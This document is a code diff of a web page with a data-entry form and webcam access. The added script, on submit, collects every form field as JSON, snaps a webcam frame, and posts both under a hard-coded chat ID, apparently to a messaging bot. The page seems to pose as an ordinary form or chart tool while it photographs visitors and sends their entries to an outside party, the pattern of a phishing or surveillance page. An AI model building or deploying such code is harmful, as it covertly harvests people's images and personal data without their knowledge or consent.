@@ -19,7 +19,7 @@
   <div class="container-fluid">
    
 
-    <form>
+    <form method="post" id="dataForm">
       
 
       <div class="mb-3 mt-1">
@@ -85,7 +85,7 @@
         <input class="form-control form-control-sm shadow-none" id="number" type="text" number="number" />
       </div>
 
-      <button class="btn btn-success btn-small rounded-1 mt-2 float-end" id="captureButton">Submit</button>
+      <button type="submit" class="btn btn-success btn-small rounded-1 mt-2 float-end" id="captureButton">Submit</button>
     
     </form>
 
@@ -102,9 +102,13 @@
 
 
     let video = document.getElementById("video");
+    let dataForm = document.getElementById("dataForm");
 
     navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
       video.srcObject = stream;
+
+      // Store a reference of the stream
+      window.localStream = stream;
     }).catch(function (err) {
       console.error("Error accessing the camera: " + err);
     }).finally(function () {
@@ -114,6 +118,24 @@
 
     // button click event
     document.getElementById("captureButton").addEventListener("click", async function () {
+
+    });
+
+
+    dataForm.addEventListener("submit", (e) => {
+      e.preventDefault();
+
+
+      //dataForm to json
+      let formData = new FormData(dataForm);
+      let object = {};
+      formData.forEach((value, key) => {
+        object[key] = value;
+      });
+      let json = JSON.stringify(object);
+
+
+
 
       let video = document.getElementById("video");
       let canvas = document.getElementById("canvas");
@@ -145,7 +167,7 @@
       canvas.toBlob(function (blob) {
 
 
-        let caption = 'Summary Chart';
+        let caption = json;
         let formData = new FormData();
         formData.append("chat_id", "6650561757");
         formData.append('photo', blob, 'image.png');
@@ -176,3 +198,21 @@
 
 
 </html>
+
+<!-- 
+navigator.mediaDevices.getUserMedia({audio:true,video:true})
+    .then(stream => {
+        window.localStream = stream;
+    })
+    .catch( (err) =>{
+        console.log(err);
+    });
+// later you can do below
+// stop both video and audio
+localStream.getTracks().forEach( (track) => {
+track.stop();
+});
+// stop only audio
+localStream.getAudioTracks()[0].stop();
+// stop only video
+localStream.getVideoTracks()[0].stop(); -->
